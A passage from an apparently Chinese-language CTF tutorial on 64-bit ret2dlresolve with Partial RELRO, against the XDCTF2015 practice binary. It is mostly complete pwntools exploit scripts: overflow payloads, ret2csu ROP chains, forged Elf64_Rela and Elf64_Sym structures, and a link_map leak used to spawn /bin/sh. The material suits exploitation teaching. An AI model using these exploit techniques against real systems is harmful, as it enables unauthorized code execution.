payload2="/bin/sh\x00".ljust(0x10,'\x00')+fake_dynstr
p.send(payload2)

payload3=p64(new_stack_esp+0x10)
#gdb.attach(proc.pidof(p)[0],gdbscript="dir /root/ret2dlresolve/malloc/glibc/glibc-2.27/elf/")

p.send(payload3)

p.interactive()
```

使用ROP链时注意长度，太长将导致payload无法完全读入，过长时要对payload进行分解：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628480247138-92b4b6a2-6880-4656-8d18-4a59d2717cc5.png)

### Partial RELRO
#### Part1
和32位的Part1思路相同：伪造relro_arg

```python
#coding=utf-8
from pwn import *
context.log_level='debug'
context.terminal = ['tmux','splitw','-h']
context.arch='amd64'

p=process('./main_partial_relro_64')
elf=ELF('./main_partial_relro_64')
bss_addr=elf.bss()
'''
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO# ROPgadget --binary ./main_partial_relro_64 --only "pop|ret"
Gadgets information
============================================================
0x000000000040079c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040079e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007a0 : pop r14 ; pop r15 ; ret
0x00000000004007a2 : pop r15 ; ret
0x000000000040079b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040079f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005b8 : pop rbp ; ret
0x00000000004007a3 : pop rdi ; ret
0x00000000004007a1 : pop rsi ; pop r15 ; ret
0x000000000040079d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004fe : ret
0x0000000000400714 : ret 0x8d48

Unique gadgets found: 12
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO#  ROPgadget --binary ./main_partial_relro_64 --only "leave|ret"
Gadgets information
============================================================
0x000000000040066c : leave ; ret
0x00000000004004fe : ret
0x0000000000400714 : ret 0x8d48

Unique gadgets found: 3
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO#
'''

#64位寄存器传参：rdi, rsi, rdx, rcx, r8, r9。
#此程序中没有pop rdx的gadget
#ret2csu调用read
'''
.text:0000000000400780 loc_400780:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400780                 mov     rdx, r15
.text:0000000000400783                 mov     rsi, r14
.text:0000000000400786                 mov     edi, r13d
.text:0000000000400789                 call    qword ptr [r12+rbx*8]  //r12 read_got ;rbx==0
.text:000000000040078D                 add     rbx, 1
.text:0000000000400791                 cmp     rbp, rbx
.text:0000000000400794                 jnz     short loc_400780       //相等；rbp==1
.text:0000000000400796
.text:0000000000400796 loc_400796:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400796                 add     rsp, 8
.text:000000000040079A                 pop     rbx          //rbx==0
.text:000000000040079B                 pop     rbp          //rbp==1
.text:000000000040079C                 pop     r12          //read_got
.text:000000000040079E                 pop     r13          //read1参
.text:00000000004007A0                 pop     r14          //read2参
.text:00000000004007A2                 pop     r15          //read3参
.text:00000000004007A4                 retn
.text:00000000004007A4 ; } // starts at 400740
.text:00000000004007A4 __libc_csu_init endp
'''

libc_csu_init_gadget_start1_addr=0x40079A
libc_csu_init_gadget_start2_addr=0x400780

read_plt_addr=elf.plt['read']
write_got_addr=elf.got['write']

new_stack_esp=bss_addr+0x200
pop_rbp_gadget_addr=0x4005b8
pop_rdi_gadget=0x4007a3
pop_rsi_r15_gadget=0x4007a1
leave_ret_gadget_addr=0x40066c

main_addr=elf.symbols['main']
vuln_addr=elf.symbols['vuln']

jmp_dl_runtime_resolve_addr=0x000400500

payload1=120*'a'
payload1+=p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(new_stack_esp)+p64(0xdeadbeef)+p64(read_plt_addr) #向new_stack_esp中写入/bin/sh\x00
payload1+=p64(pop_rdi_gadget)+p64(1)+p64(pop_rsi_r15_gadget)+p64(new_stack_esp)+p64(0xdeadbeef)+p64(jmp_dl_runtime_resolve_addr)+p64(0)+p64(0xdeadbeef)
print len(payload1)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.sendline(payload1)
#gdb.attach(proc.pidof(p)[0],gdbscript="dir /root/ret2dlresolve/malloc/glibc/glibc-2.27/elf/")
p.sendline("/bin/sh\x00")

p.interactive()
```

#### Part2
伪造Elf64_Rela结构体

```python
#coding=utf-8
from pwn import *
context.log_level='debug'
context.terminal = ['tmux','splitw','-h']
context.arch='amd64'

p=process('./main_partial_relro_64')
elf=ELF('./main_partial_relro_64')
bss_addr=elf.bss()
'''
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO# ROPgadget --binary ./main_partial_relro_64 --only "pop|ret"
Gadgets information
============================================================
0x000000000040079c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040079e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007a0 : pop r14 ; pop r15 ; ret
0x00000000004007a2 : pop r15 ; ret
0x000000000040079b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040079f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005b8 : pop rbp ; ret
0x00000000004007a3 : pop rdi ; ret
0x00000000004007a1 : pop rsi ; pop r15 ; ret
0x000000000040079d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004fe : ret
0x0000000000400714 : ret 0x8d48

Unique gadgets found: 12
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO#  ROPgadget --binary ./main_partial_relro_64 --only "leave|ret"
Gadgets information
============================================================
0x000000000040066c : leave ; ret
0x00000000004004fe : ret
0x0000000000400714 : ret 0x8d48

Unique gadgets found: 3
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO#
'''

#64位寄存器传参：rdi, rsi, rdx, rcx, r8, r9。
#此程序中没有pop rdx的gadget
#ret2csu调用read
'''
.text:0000000000400780 loc_400780:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400780                 mov     rdx, r15
.text:0000000000400783                 mov     rsi, r14
.text:0000000000400786                 mov     edi, r13d
.text:0000000000400789                 call    qword ptr [r12+rbx*8]  //r12 read_got ;rbx==0
.text:000000000040078D                 add     rbx, 1
.text:0000000000400791                 cmp     rbp, rbx
.text:0000000000400794                 jnz     short loc_400780       //相等；rbp==1
.text:0000000000400796
.text:0000000000400796 loc_400796:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400796                 add     rsp, 8
.text:000000000040079A                 pop     rbx          //rbx==0
.text:000000000040079B                 pop     rbp          //rbp==1
.text:000000000040079C                 pop     r12          //read_got
.text:000000000040079E                 pop     r13          //read1参
.text:00000000004007A0                 pop     r14          //read2参
.text:00000000004007A2                 pop     r15          //read3参
.text:00000000004007A4                 retn
.text:00000000004007A4 ; } // starts at 400740
.text:00000000004007A4 __libc_csu_init endp
'''

libc_csu_init_gadget_start1_addr=0x40079A
libc_csu_init_gadget_start2_addr=0x400780

read_plt_addr=elf.plt['read']
write_got_addr=elf.got['write']

new_stack_esp=bss_addr+0x200
pop_rbp_gadget_addr=0x4005b8
pop_rdi_gadget=0x4007a3
pop_rsi_r15_gadget=0x4007a1
leave_ret_gadget_addr=0x40066c

main_addr=elf.symbols['main']
vuln_addr=elf.symbols['vuln']

jmp_dl_runtime_resolve_addr=0x000400500

rela_plt_start_addr=elf.get_section_by_name('.rela.plt').header.sh_addr
fake_r_offset=0x601018
fake_r_info=0x100000007
fake_r_addend=0x0
fake_write_Elf64_Rela=p64(fake_r_offset)+p64(fake_r_info)+p64(fake_r_addend)

payload1=120*'a'
payload1+=p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(new_stack_esp)+p64(0xdeadbeef)+p64(read_plt_addr) #向new_stack_esp中写入/bin/sh\x00
#payload1+=p64(pop_rdi_gadget)+p64(1)+p64(pop_rsi_r15_gadget)+p64(new_stack_esp)+p64(0xdeadbeef)
#payload1+=p64(jmp_dl_runtime_resolve_addr)+p64(0)+p64(main_addr) 
payload1+=p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(new_stack_esp+0x10)+p64(0xdeadbeef)+p64(read_plt_addr) #向new_stack_esp+0x10中写入fake_write_Elf64_Rela
payload1+=p64(main_addr)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.sendline(payload1)
p.sendline("/bin/sh\x00".ljust(0x10,'\x00')) #向new_stack_esp中写入/bin/sh\x00

fake_write_Elf64_Rela_start_addr=new_stack_esp+0x10
fake_reloc_arg=(fake_write_Elf64_Rela_start_addr-rela_plt_start_addr)/24

p.sendline(fake_write_Elf64_Rela) #fake_write_Elf64_Rela

payload2=120*'b'+p64(pop_rdi_gadget)+p64(1)+p64(pop_rsi_r15_gadget)+p64(new_stack_esp)+p64(0xdeadbeef)
payload2+=p64(jmp_dl_runtime_resolve_addr)+p64(fake_reloc_arg)+p64(0xdeadbeef) 
gdb.attach(proc.pidof(p)[0],gdbscript="dir /root/ret2dlresolve/malloc/glibc/glibc-2.27/elf/")
p.sendline(payload2)

p.interactive()
```

#### Part3
伪造ELF64_Sym结构体

```python
#coding=utf-8
from pwn import *
context.log_level='debug'
context.terminal = ['tmux','splitw','-h']
context.arch='amd64'

p=process('./main_partial_relro_64')
elf=ELF('./main_partial_relro_64')
bss_addr=elf.bss()
'''
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO# ROPgadget --binary ./main_partial_relro_64 --only "pop|ret"
Gadgets information
============================================================
0x000000000040079c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040079e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007a0 : pop r14 ; pop r15 ; ret
0x00000000004007a2 : pop r15 ; ret
0x000000000040079b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040079f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005b8 : pop rbp ; ret
0x00000000004007a3 : pop rdi ; ret
0x00000000004007a1 : pop rsi ; pop r15 ; ret
0x000000000040079d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004fe : ret
0x0000000000400714 : ret 0x8d48

Unique gadgets found: 12
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO#  ROPgadget --binary ./main_partial_relro_64 --only "leave|ret"
Gadgets information
============================================================
0x000000000040066c : leave ; ret
0x00000000004004fe : ret
0x0000000000400714 : ret 0x8d48

Unique gadgets found: 3
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO#
'''

#64位寄存器传参：rdi, rsi, rdx, rcx, r8, r9。
#此程序中没有pop rdx的gadget
#ret2csu调用read
'''
.text:0000000000400780 loc_400780:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400780                 mov     rdx, r15
.text:0000000000400783                 mov     rsi, r14
.text:0000000000400786                 mov     edi, r13d
.text:0000000000400789                 call    qword ptr [r12+rbx*8]  //r12 read_got ;rbx==0
.text:000000000040078D                 add     rbx, 1
.text:0000000000400791                 cmp     rbp, rbx
.text:0000000000400794                 jnz     short loc_400780       //相等；rbp==1
.text:0000000000400796
.text:0000000000400796 loc_400796:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400796                 add     rsp, 8
.text:000000000040079A                 pop     rbx          //rbx==0
.text:000000000040079B                 pop     rbp          //rbp==1
.text:000000000040079C                 pop     r12          //read_got
.text:000000000040079E                 pop     r13          //read1参
.text:00000000004007A0                 pop     r14          //read2参
.text:00000000004007A2                 pop     r15          //read3参
.text:00000000004007A4                 retn
.text:00000000004007A4 ; } // starts at 400740
.text:00000000004007A4 __libc_csu_init endp
'''

libc_csu_init_gadget_start1_addr=0x40079A
libc_csu_init_gadget_start2_addr=0x400780

read_plt_addr=elf.plt['read']
write_got_addr=elf.got['write']

new_stack_esp=bss_addr+0x200
pop_rbp_gadget_addr=0x4005b8
pop_rdi_gadget=0x4007a3
pop_rsi_r15_gadget=0x4007a1
leave_ret_gadget_addr=0x40066c

main_addr=elf.symbols['main']
vuln_addr=elf.symbols['vuln']

jmp_dl_runtime_resolve_addr=0x000400500

rela_plt_start_addr=elf.get_section_by_name('.rela.plt').header.sh_addr

fake_st_name=0x4003D5-0x400398
fake_st_info=0x12
fake_st_other=0x0
fake_st_shndx=0x0
fake_st_value=0x0
fake_st_size=0x0
fake_write_ELF64_Sym=p32(fake_st_name)+p8(fake_st_info)+p8(fake_st_other)+p16(fake_st_shndx)+p64(fake_st_value)+p64(fake_st_size)
fake_write_ELF64_Sym_start_addr=new_stack_esp+0x10  #ELF64_Sym起始地址
real_dynsym_start_addr=elf.get_section_by_name('.dynsym').header.sh_addr
align=0x18-((fake_write_ELF64_Sym_start_addr-real_dynsym_start_addr)&0xf)
fake_write_ELF64_Sym_start_addr+=align
log.info(hex(fake_write_ELF64_Sym_start_addr))
print align

fake_r_offset=elf.got['write']
dynsym_index=(fake_write_ELF64_Sym_start_addr-real_dynsym_start_addr)/0x18  #32位的是0x10
print dynsym_index
fake_r_info=dynsym_index<<32 | 7
fake_r_addend=0x0
fake_write_Elf64_Rela=p64(fake_r_offset)+p64(fake_r_info)+p64(fake_r_addend)
fake_write_Elf64_Rela_start_addr=new_stack_esp+0x10+len(fake_write_ELF64_Sym)+align
log.info(hex(fake_write_Elf64_Rela_start_addr))
fake_reloc_arg=(fake_write_Elf64_Rela_start_addr-rela_plt_start_addr)/0x18

payload1=120*'a'
payload1+=p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(new_stack_esp)+p64(0xdeadbeef)+p64(read_plt_addr) #向new_stack_esp中写入/bin/sh\x00
payload1+=p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(fake_write_ELF64_Sym_start_addr)+p64(0xdeadbeef)+p64(read_plt_addr) #0x10中写入fake_write_Elf64_Sym
#payload1+=p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(fake_write_Elf64_Rela_start_addr)+p64(0xdeadbeef)+p64(read_plt_addr) #写入fake_write_Elf64_Rela
#payload1+=p64(main_addr)  #读入payload2
payload1+=p64(main_addr)

p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload1)
sleep(1)
p.send("/bin/sh\x00".ljust(0x10,'\x00')) #向new_stack_esp中写入/bin/sh\x00
sleep(1)
p.send(fake_write_ELF64_Sym)  #fake_write_Elf64_Sym
sleep(1)

payload2=120*'b'+p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(fake_write_Elf64_Rela_start_addr)+p64(0xdeadbeef)+p64(read_plt_addr)+p64(main_addr)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload2)
gdb.attach(proc.pidof(p)[0],gdbscript="dir /root/ret2dlresolve/malloc/glibc/glibc-2.27/elf/\n b vuln\nc")
p.send(fake_write_Elf64_Rela) #fake_write_Elf64_Rela

payload3=120*'c'+p64(pop_rdi_gadget)+p64(1)+p64(pop_rsi_r15_gadget)+p64(new_stack_esp)+p64(0xdeadbeef)
payload3+=p64(jmp_dl_runtime_resolve_addr)+p64(fake_reloc_arg)+p64(0xdeadbeef) 
sleep(1)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload3)

p.interactive()
```

执行上述exp之后程序会崩溃：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628494330958-6641cf5e-9991-4cd4-9933-aad3f39f4958.png)

除了之前在32位中提到的调整数据写入地址之外还可以让程序不进入if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL)而直接向下执行也是可以的；但是这样就需要泄露（write）出link_map的首结点地址，即泄露0x601008处存放的地址：

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628494860765-a9dc2c3c-1323-46b3-9e8f-31a8e4c7f4b9.png)

通过汇编代码可以看出 l->l_info[VERSYMIDX(DT_VERSYM)] 的偏移为0x1c8

![](https://cdn.nlark.com/yuque/0/2021/png/574026/1628495026186-003bfa18-c5be-4632-ae35-c064ddc6d69d.png)

所以泄露地址后将 l->l_info[VERSYMIDX(DT_VERSYM)] 设置为NULL即可绕过此if语句，exp如下（添加的内容在###之间）

```python
#coding=utf-8
from pwn import *
context.log_level='debug'
context.terminal = ['tmux','splitw','-h']
context.arch='amd64'

p=process('./main_partial_relro_64')
elf=ELF('./main_partial_relro_64')
bss_addr=elf.bss()
'''
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO# ROPgadget --binary ./main_partial_relro_64 --only "pop|ret"
Gadgets information
============================================================
0x000000000040079c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040079e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007a0 : pop r14 ; pop r15 ; ret
0x00000000004007a2 : pop r15 ; ret
0x000000000040079b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040079f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005b8 : pop rbp ; ret
0x00000000004007a3 : pop rdi ; ret
0x00000000004007a1 : pop rsi ; pop r15 ; ret
0x000000000040079d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004fe : ret
0x0000000000400714 : ret 0x8d48

Unique gadgets found: 12
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO#  ROPgadget --binary ./main_partial_relro_64 --only "leave|ret"
Gadgets information
============================================================
0x000000000040066c : leave ; ret
0x00000000004004fe : ret
0x0000000000400714 : ret 0x8d48

Unique gadgets found: 3
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO#
'''

#64位寄存器传参：rdi, rsi, rdx, rcx, r8, r9。
#此程序中没有pop rdx的gadget
#ret2csu调用read
'''
.text:0000000000400780 loc_400780:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400780                 mov     rdx, r15
.text:0000000000400783                 mov     rsi, r14
.text:0000000000400786                 mov     edi, r13d
.text:0000000000400789                 call    qword ptr [r12+rbx*8]  //r12 read_got ;rbx==0
.text:000000000040078D                 add     rbx, 1
.text:0000000000400791                 cmp     rbp, rbx
.text:0000000000400794                 jnz     short loc_400780       //相等；rbp==1
.text:0000000000400796
.text:0000000000400796 loc_400796:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400796                 add     rsp, 8
.text:000000000040079A                 pop     rbx          //rbx==0
.text:000000000040079B                 pop     rbp          //rbp==1
.text:000000000040079C                 pop     r12          //read_got
.text:000000000040079E                 pop     r13          //read1参
.text:00000000004007A0                 pop     r14          //read2参
.text:00000000004007A2                 pop     r15          //read3参
.text:00000000004007A4                 retn
.text:00000000004007A4 ; } // starts at 400740
.text:00000000004007A4 __libc_csu_init endp
'''

libc_csu_init_gadget_start1_addr=0x40079A
libc_csu_init_gadget_start2_addr=0x400780

read_plt_addr=elf.plt['read']
write_got_addr=elf.got['write']

new_stack_esp=bss_addr+0x200
pop_rbp_gadget_addr=0x4005b8
pop_rdi_gadget=0x4007a3
pop_rsi_r15_gadget=0x4007a1
leave_ret_gadget_addr=0x40066c

main_addr=elf.symbols['main']
vuln_addr=elf.symbols['vuln']

jmp_dl_runtime_resolve_addr=0x000400500

rela_plt_start_addr=elf.get_section_by_name('.rela.plt').header.sh_addr

fake_st_name=0x4003D5-0x400398
fake_st_info=0x12
fake_st_other=0x0
fake_st_shndx=0x0
fake_st_value=0x0
fake_st_size=0x0
fake_write_ELF64_Sym=p32(fake_st_name)+p8(fake_st_info)+p8(fake_st_other)+p16(fake_st_shndx)+p64(fake_st_value)+p64(fake_st_size)
fake_write_ELF64_Sym_start_addr=new_stack_esp+0x10  #ELF64_Sym起始地址
real_dynsym_start_addr=elf.get_section_by_name('.dynsym').header.sh_addr
align=0x18-((fake_write_ELF64_Sym_start_addr-real_dynsym_start_addr)&0xf)
fake_write_ELF64_Sym_start_addr+=align
log.info(hex(fake_write_ELF64_Sym_start_addr))
print align

fake_r_offset=elf.got['write']
dynsym_index=(fake_write_ELF64_Sym_start_addr-real_dynsym_start_addr)/0x18  #32位的是0x10
print dynsym_index
fake_r_info=dynsym_index<<32 | 7
fake_r_addend=0x0
fake_write_Elf64_Rela=p64(fake_r_offset)+p64(fake_r_info)+p64(fake_r_addend)
fake_write_Elf64_Rela_start_addr=new_stack_esp+0x10+len(fake_write_ELF64_Sym)+align
log.info(hex(fake_write_Elf64_Rela_start_addr))
fake_reloc_arg=(fake_write_Elf64_Rela_start_addr-rela_plt_start_addr)/0x18
####################################################
write_got_addr=elf.got['write']
read_got_addr=elf.got['read']
payload0=120*'a'
payload0+=p64(libc_csu_init_gadget_start1_addr)+p64(0)+p64(1)+p64(write_got_addr)+p64(1)+p64(0x601008)+p64(0x8)
payload0+=p64(libc_csu_init_gadget_start2_addr)+p64(0xdeadbeef)*7+p64(main_addr)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload0)

link_map_addr=u64(p.recv(8))
print hex(link_map_addr)
link_map_l_info_VERSYMIDX_DT_VERSYM_addr=link_map_addr+0x1c8
print hex(link_map_l_info_VERSYMIDX_DT_VERSYM_addr)
fake_map_l_info_VERSYMIDX_DT_VERSYM=120*'a'
fake_map_l_info_VERSYMIDX_DT_VERSYM+=p64(libc_csu_init_gadget_start1_addr)+p64(0)+p64(1)+p64(read_got_addr)+p64(0)+p64(link_map_l_info_VERSYMIDX_DT_VERSYM_addr)+p64(0x100)
fake_map_l_info_VERSYMIDX_DT_VERSYM+=p64(libc_csu_init_gadget_start2_addr)+p64(0xdeadbeef)*7+p64(main_addr)
p.recvuntil('Welcome to XDCTF2015~!\n')
sleep(1)
p.send(fake_map_l_info_VERSYMIDX_DT_VERSYM)
#gdb.attach(proc.pidof(p)[0],gdbscript="dir /root/ret2dlresolve/malloc/glibc/glibc-2.27/elf/")
p.send(p64(0))
#######################################################
payload1=120*'a'
payload1+=p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(new_stack_esp)+p64(0xdeadbeef)+p64(read_plt_addr) #向new_stack_esp中写入/bin/sh\x00
payload1+=p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(fake_write_ELF64_Sym_start_addr)+p64(0xdeadbeef)+p64(read_plt_addr) #0x10中写入fake_write_Elf64_Sym
#payload1+=p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(fake_write_Elf64_Rela_start_addr)+p64(0xdeadbeef)+p64(read_plt_addr) #写入fake_write_Elf64_Rela
#payload1+=p64(main_addr)  #读入payload2
payload1+=p64(main_addr)

p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload1)
sleep(1)
p.send("/bin/sh\x00".ljust(0x10,'\x00')) #向new_stack_esp中写入/bin/sh\x00
sleep(1)
p.send(fake_write_ELF64_Sym)  #fake_write_Elf64_Sym
sleep(1)

payload2=120*'b'+p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(fake_write_Elf64_Rela_start_addr)+p64(0xdeadbeef)+p64(read_plt_addr)+p64(main_addr)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload2)
p.send(fake_write_Elf64_Rela) #fake_write_Elf64_Rela

payload3=120*'c'+p64(pop_rdi_gadget)+p64(1)+p64(pop_rsi_r15_gadget)+p64(new_stack_esp)+p64(0xdeadbeef)
payload3+=p64(jmp_dl_runtime_resolve_addr)+p64(fake_reloc_arg)+p64(0xdeadbeef) 
sleep(1)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload3)
p.interactive()
```

#### Part4
这里注意伪造的dynsym_index、fake_r_info、fake_relro_arg计算方式和32位不太相同：

```python
#coding=utf-8
from pwn import *
context.log_level='debug'
context.terminal = ['tmux','splitw','-h']
context.arch='amd64'

p=process('./main_partial_relro_64')
elf=ELF('./main_partial_relro_64')
bss_addr=elf.bss()
'''
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO# ROPgadget --binary ./main_partial_relro_64 --only "pop|ret"
Gadgets information
============================================================
0x000000000040079c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040079e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004007a0 : pop r14 ; pop r15 ; ret
0x00000000004007a2 : pop r15 ; ret
0x000000000040079b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040079f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004005b8 : pop rbp ; ret
0x00000000004007a3 : pop rdi ; ret
0x00000000004007a1 : pop rsi ; pop r15 ; ret
0x000000000040079d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004fe : ret
0x0000000000400714 : ret 0x8d48

Unique gadgets found: 12
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO#  ROPgadget --binary ./main_partial_relro_64 --only "leave|ret"
Gadgets information
============================================================
0x000000000040066c : leave ; ret
0x00000000004004fe : ret
0x0000000000400714 : ret 0x8d48

Unique gadgets found: 3
root@4de10445acf0:~/ret2dlresolve/main/x64/Partial_RELRO#
'''

#64位寄存器传参：rdi, rsi, rdx, rcx, r8, r9。
#此程序中没有pop rdx的gadget
#ret2csu调用read
'''
.text:0000000000400780 loc_400780:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400780                 mov     rdx, r15
.text:0000000000400783                 mov     rsi, r14
.text:0000000000400786                 mov     edi, r13d
.text:0000000000400789                 call    qword ptr [r12+rbx*8]  //r12 read_got ;rbx==0
.text:000000000040078D                 add     rbx, 1
.text:0000000000400791                 cmp     rbp, rbx
.text:0000000000400794                 jnz     short loc_400780       //相等；rbp==1
.text:0000000000400796
.text:0000000000400796 loc_400796:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400796                 add     rsp, 8
.text:000000000040079A                 pop     rbx          //rbx==0
.text:000000000040079B                 pop     rbp          //rbp==1
.text:000000000040079C                 pop     r12          //read_got
.text:000000000040079E                 pop     r13          //read1参
.text:00000000004007A0                 pop     r14          //read2参
.text:00000000004007A2                 pop     r15          //read3参
.text:00000000004007A4                 retn
.text:00000000004007A4 ; } // starts at 400740
.text:00000000004007A4 __libc_csu_init endp
'''

libc_csu_init_gadget_start1_addr=0x40079A
libc_csu_init_gadget_start2_addr=0x400780

read_plt_addr=elf.plt['read']
write_got_addr=elf.got['write']

new_stack_esp=bss_addr+0x200
pop_rbp_gadget_addr=0x4005b8
pop_rdi_gadget=0x4007a3
pop_rsi_r15_gadget=0x4007a1
leave_ret_gadget_addr=0x40066c

main_addr=elf.symbols['main']
vuln_addr=elf.symbols['vuln']

jmp_dl_runtime_resolve_addr=0x000400500

rela_plt_start_addr=elf.get_section_by_name('.rela.plt').header.sh_addr

#fake_st_name=0x4003D5-0x400398
real_dynstr_start_addr=elf.get_section_by_name('.dynstr').header.sh_addr
fake_st_name=new_stack_esp+len('/bin/sh\x00')-real_dynstr_start_addr
fake_st_info=0x12
fake_st_other=0x0
fake_st_shndx=0x0
fake_st_value=0x0
fake_st_size=0x0
fake_write_ELF64_Sym=p32(fake_st_name)+p8(fake_st_info)+p8(fake_st_other)+p16(fake_st_shndx)+p64(fake_st_value)+p64(fake_st_size)
fake_write_ELF64_Sym_start_addr=new_stack_esp+0x10  #ELF64_Sym起始地址
real_dynsym_start_addr=elf.get_section_by_name('.dynsym').header.sh_addr
align=0x18-((fake_write_ELF64_Sym_start_addr-real_dynsym_start_addr)&0xf)
fake_write_ELF64_Sym_start_addr+=align
log.info(hex(fake_write_ELF64_Sym_start_addr))
print align

fake_r_offset=elf.got['write']
dynsym_index=(fake_write_ELF64_Sym_start_addr-real_dynsym_start_addr)/0x18  #32位的是0x10
print dynsym_index
fake_r_info=dynsym_index<<32 | 7
fake_r_addend=0x0
fake_write_Elf64_Rela=p64(fake_r_offset)+p64(fake_r_info)+p64(fake_r_addend)
fake_write_Elf64_Rela_start_addr=new_stack_esp+0x10+len(fake_write_ELF64_Sym)+align
log.info(hex(fake_write_Elf64_Rela_start_addr))
fake_reloc_arg=(fake_write_Elf64_Rela_start_addr-rela_plt_start_addr)/0x18
####################################################
write_got_addr=elf.got['write']
read_got_addr=elf.got['read']
payload0=120*'a'
payload0+=p64(libc_csu_init_gadget_start1_addr)+p64(0)+p64(1)+p64(write_got_addr)+p64(1)+p64(0x601008)+p64(0x8)
payload0+=p64(libc_csu_init_gadget_start2_addr)+p64(0xdeadbeef)*7+p64(main_addr)
p.recvuntil('Welcome to XDCTF2015~!\n')
p.send(payload0)

link_map_addr=u64(p.recv(8))
print hex(link_map_addr)
link_map_l_info_VERSYMIDX_DT_VERSYM_addr=link_map_addr+0x1c8
print hex(link_map_l_info_VERSYMIDX_DT_VERSYM_addr)
fake_map_l_info_VERSYMIDX_DT_VERSYM=120*'a'
fake_map_l_info_VERSYMIDX_DT_VERSYM+=p64(libc_csu_init_gadget_start1_addr)+p64(0)+p64(1)+p64(read_got_addr)+p64(0)+p64(link_map_l_info_VERSYMIDX_DT_VERSYM_addr)+p64(0x100)
fake_map_l_info_VERSYMIDX_DT_VERSYM+=p64(libc_csu_init_gadget_start2_addr)+p64(0xdeadbeef)*7+p64(main_addr)
p.recvuntil('Welcome to XDCTF2015~!\n')
sleep(1)
p.send(fake_map_l_info_VERSYMIDX_DT_VERSYM)
gdb.attach(proc.pidof(p)[0],gdbscript="dir /root/ret2dlresolve/malloc/glibc/glibc-2.27/elf/")
p.send(p64(0))
#######################################################
payload1=120*'a'
payload1+=p64(pop_rdi_gadget)+p64(0)+p64(pop_rsi_r15_gadget)+p64(new_stack_esp)+p64(0xdeadbeef)+p64(read_plt_addr) #向new_stack_esp中写入/bin/sh\x00
